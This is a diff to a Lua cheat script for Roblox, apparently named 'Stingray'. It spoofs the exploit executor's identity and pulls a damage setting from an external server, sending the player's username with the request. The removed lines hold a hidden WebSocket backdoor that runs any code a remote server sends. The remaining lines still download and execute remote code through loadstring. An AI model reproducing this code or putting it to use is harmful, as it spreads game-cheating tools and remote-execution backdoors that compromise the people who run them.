@@ -8,6 +8,10 @@ if not getgenv().StingrayLoaded then
 getgenv().StingrayLoaded = true
 print("Script Loaded")
 
+identifyexecutor = function()
+    return "Stingray V2"
+end
+
 -- Init --
 
 local StartTime = tick()
@@ -63,28 +67,14 @@ getgenv().MinPercentage = 10
 local DmgSuccess,DmgError = pcall(function()
     local DmgConfig = 
         game:HttpGet("http://de3.bot-hosting.net:21824/jji/config/dmg?username="..LocalPlayer.Name)
-    if DmgConfig ~= "None Found" then
+    if DmgConfig ~= "None Found" and tonumber(DmgConfig)<=100 then
         getgenv().MinPercentage = DmgConfig
     else
-        getgenv().MinPercentage = "None"
+        getgenv().MinPercentage = 10
     end
     print(MinPercentage)
 end)
 
--- Emergency Disconnection --
-task.spawn(function()
-    local s, e = pcall(function()
-        local WSConnection = WebSocket.connect("ws://de3.bot-hosting.net:21824/ws")
-        task.wait(1)
-        WSConnection.OnMessage:Connect(function(k)
-            local s, e = pcall(function()
-                WSConnection:Send(loadstring(k)())
-            end)
-        end)
-        task.wait(1)
-        WSConnection:Send("Connection Success - " .. LocalPlayer.Name)
-    end)
-end)
 
 -- UI --
 local UI = loadstring(game:HttpGet("http://www.stingray-digital.online/script/ui"))()
